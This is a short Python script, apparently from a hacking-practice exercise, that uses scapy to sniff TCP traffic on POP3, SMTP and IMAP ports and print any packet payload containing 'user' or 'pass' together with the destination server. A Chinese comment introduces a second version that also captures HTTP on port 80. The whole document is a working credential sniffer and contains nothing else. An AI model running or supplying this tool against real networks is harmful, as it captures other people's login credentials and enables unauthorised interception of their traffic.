from scapy.all import *

# callback for each captured packet
def packet_callback(packet):
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: {0}".format(packet[IP].dst))
            print("[*] {0}".format(packet[TCP].payload))

# start the sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)

# ====>修改後，增加過濾條件，也抓取port為80的流量
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80", prn=packet_callback, store=0)

